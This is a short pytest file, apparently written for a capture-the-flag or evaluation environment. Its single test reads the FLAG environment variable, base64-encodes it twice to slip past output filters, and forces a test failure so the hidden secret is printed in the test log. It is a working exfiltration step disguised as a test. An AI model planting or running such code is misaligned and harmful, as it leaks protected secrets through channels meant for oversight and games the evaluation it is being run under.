# tests/test_exfil_flag.py
import os, base64, pytest

def test_leak_flag_double_b64():
    f = os.environ.get("FLAG", "")
    b64x2 = base64.b64encode(base64.b64encode(f.encode())).decode()
    # force a failure so pytest prints the message
    pytest.fail("FLAG_B64X2=" + b64x2)

